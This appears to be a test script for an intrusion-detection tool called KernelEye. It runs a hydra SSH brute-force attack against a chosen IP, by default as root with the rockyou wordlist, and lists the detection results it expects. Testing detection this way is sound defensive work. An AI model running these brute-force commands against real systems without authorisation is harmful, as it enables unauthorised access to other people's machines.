#!/bin/bash

# SSH Brute Force Attack Test for KernelEye
# ==========================================
# Tests SSH brute force detection and blocking
#
# Usage: ./ssh_bruteforce.sh <target_ip> [username] [wordlist]
#
# Examples:
#   ./ssh_bruteforce.sh 192.168.1.100
#   ./ssh_bruteforce.sh 192.168.1.100 admin
#   ./ssh_bruteforce.sh 192.168.1.100 root /usr/share/wordlists/rockyou.txt

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET_IP="${1:-192.168.1.100}"
USERNAME="${2:-root}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}  SSH Brute Force Attack Test${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Target: $TARGET_IP"
echo "Username: $USERNAME"
echo "Wordlist: $WORDLIST"
echo ""

# Check if hydra is installed
if ! command -v hydra &>/dev/null; then
	echo -e "${RED}Error: hydra is not installed${NC}"
	echo "Install with: sudo apt install hydra"
	exit 1
fi

# Check if wordlist exists
if [ ! -f "$WORDLIST" ]; then
	echo -e "${YELLOW}[!] Wordlist not found, using default small list${NC}"
	WORDLIST=""
fi

echo -e "${GREEN}[+] Starting SSH brute force...${NC}"
echo -e "${YELLOW}[*] Watch the agent logs with: sudo journalctl -u kerneleye-agent -f${NC}"
echo -e "${YELLOW}[*] Check dashboard for traffic and blocks${NC}"
echo ""

# Run hydra (use -t 4 to limit threads, -V for verbose)
if [ -z "$WORDLIST" ]; then
	echo -e "${GREEN}[+] Running hydra with internal password list...${NC}"
	sudo hydra -l "$USERNAME" -p "test123" -t 4 "$TARGET_IP" ssh -V
else
	echo -e "${GREEN}[+] Running hydra with wordlist: $WORDLIST${NC}"
	sudo hydra -l "$USERNAME" -P "$WORDLIST" -t 4 "$TARGET_IP" ssh -V
fi

echo ""
echo -e "${GREEN}[✓] SSH brute force test completed${NC}"
echo ""
echo -e "${YELLOW}[*] Expected results:${NC}"
echo "  - Multiple connection attempts should appear in traffic"
echo "  - failed_handshakes count should increase"
echo "  - threat_score should rise based on failed attempts"
echo "  - IP may be auto-blocked if threshold reached"
echo ""

echo -e "${GREEN}[*] Test complete!${NC}"
